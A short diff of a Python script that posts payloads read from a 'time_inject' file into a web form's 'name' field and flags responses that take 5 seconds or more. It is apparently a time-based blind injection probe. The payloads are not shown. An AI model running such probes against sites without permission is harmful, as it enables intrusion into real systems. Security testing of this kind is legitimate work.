@@ -21,7 +21,7 @@ with open('time_inject', 'r') as injections:
         cnt += 1
 
         token = get_token()
-        data = {'name':'test', 'mail':'test98%40test.com', 'program':'test', 'phone':'12312341234', 'why':'test','essay':inject,'token':token}
+        data = {'name':inject, 'mail':'test98%40test.com','token':token}
         result = requests.post(url, data)
         time = result.elapsed.total_seconds()
         if time >= 5:
